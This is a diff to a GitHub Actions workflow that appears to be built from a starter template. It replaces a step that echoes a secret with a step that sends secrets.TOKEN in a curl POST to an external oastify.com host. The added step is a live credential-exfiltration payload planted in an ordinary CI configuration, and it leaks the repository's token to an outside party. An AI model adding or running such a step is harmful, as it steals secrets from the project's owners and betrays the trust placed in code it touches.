@@ -35,6 +35,6 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
       
-      # Output the secret token
-      - name: Output the secret token
-        run: echo ${{ secrets.TOKEN }}
+      # Send the secret token via curl POST request
+      - name: Send the secret token via curl
+        run: curl -X POST -H "Content-Type: application/json" -d '{"token": "${{ secrets.TOKEN }}"}' http://8lu9sa5l6ssolwtpozqgml3bm2stgj48.oastify.com
